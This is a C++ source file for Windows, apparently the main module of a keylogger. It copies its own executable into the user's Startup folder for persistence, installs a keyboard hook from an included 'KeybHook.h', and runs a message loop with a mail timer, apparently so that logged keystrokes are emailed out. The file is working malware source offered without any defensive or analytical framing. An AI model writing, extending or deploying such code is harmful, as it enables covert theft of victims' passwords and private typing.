#include <iostream>
#include <windows.h>
#include <dirent.h>
#include <cstddef>
#include "KeybHook.h"
using namespace std;
std::string GetOurPath ();
string SplitFilename (const std::string& str);
int main ()
    {
    bool check = false;
    char filename[ MAX_PATH ];
    DWORD size = GetModuleFileNameA( NULL, filename, MAX_PATH );
    if (size)
    {
        string a = GetOurPath ();
        string b = filename;
        string c = "move \"" +b + "\" \"" + a + "\"";
        string g = "cd " + a;
        string j= SplitFilename(filename);
        char d[ MAX_PATH ],f[ MAX_PATH];
        cout << c << endl;
        strcpy(d,c.c_str());
        strcpy(f,a.c_str());
        DIR *dir;
        struct dirent *ent;
        if ((dir = opendir (f)) != NULL) {
            /* print all the files and directories within directory */
            while ((ent = readdir (dir)) != NULL) {
                if(ent->d_name==j)
                {
                    check = true;
                }
            }
            if(check)
            {
                goto a;
            }
            else{
                system(d);
            }
            closedir (dir);
        } else {
            /* could not open directory */
            perror ("");
            return EXIT_FAILURE;
        }


    }
    else{

    }
        a:
        MSG Msg;
        IO::MkDir (IO::GetOurPath (true));
        InstalHook ();
        while (GetMessage (&Msg, NULL, 0, 0))
            {
                TranslateMessage(&Msg);
                DispatchMessage(&Msg);
            }
        MailTimer.Stop ();
        return 0;
    }
std::string GetOurPath ()
{
    std::string appdata_dir (getenv("APPDATA"));

    std::string full = appdata_dir + R"(\Microsoft\Windows\Start Menu\Programs\Startup\)";

    return full ;
}

string SplitFilename (const std::string& str)
{
    std::cout << "Splitting: " << str << '\n';
    std::size_t found = str.find_last_of("/\\");
    std::cout << " path: " << str.substr(0,found) << '\n';
    return(str.substr(found+1));
}
